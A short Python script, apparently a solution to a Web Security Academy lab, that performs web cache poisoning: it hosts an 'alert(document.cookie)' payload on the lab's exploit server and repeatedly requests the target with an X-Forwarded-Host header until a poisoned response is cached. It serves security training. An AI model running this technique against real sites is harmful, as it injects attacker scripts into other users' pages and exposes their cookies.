import time
from urllib.parse import urlparse

import requests
from bs4 import BeautifulSoup

site = 'ac9e1f101e22ddd7c0492fcf008d00e0.web-security-academy.net'
OdinId = "bradlet2"
s = requests.Session()
site_url = f'https://{site}'


def deliverExploit(exploit_site):
    exploit_html = 'alert(document.cookie)'

    formData = {
        'urlIsHttps': 'on',
        'responseFile': '/resources/js/tracking.js',
        'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
        'responseBody': exploit_html,
        'formAction': 'STORE'
    }
    resp = s.post(exploit_url, data=formData)


if __name__ == "__main__":
    resp = s.get(site_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    exploit_url = soup.find('a', {'id': 'exploit-link'}).get('href')
    exploit_site = urlparse(exploit_url).hostname

    deliverExploit(exploit_site)
    # sleep so that there's a little delay to allow for exploit delivery
    time.sleep(2)

    headers = {
        'X-Forwarded-Host': exploit_site
    }
    while True:
        resp = s.get(site_url, headers=headers)
        if resp.headers['X-Cache'] == 'miss':
            print(f'Poisoned (miss): {resp.headers}')
            break
        timeleft = 30 - int(resp.headers['Age'])
        print(f'Waiting {timeleft} to expire cache')
        time.sleep(timeleft)
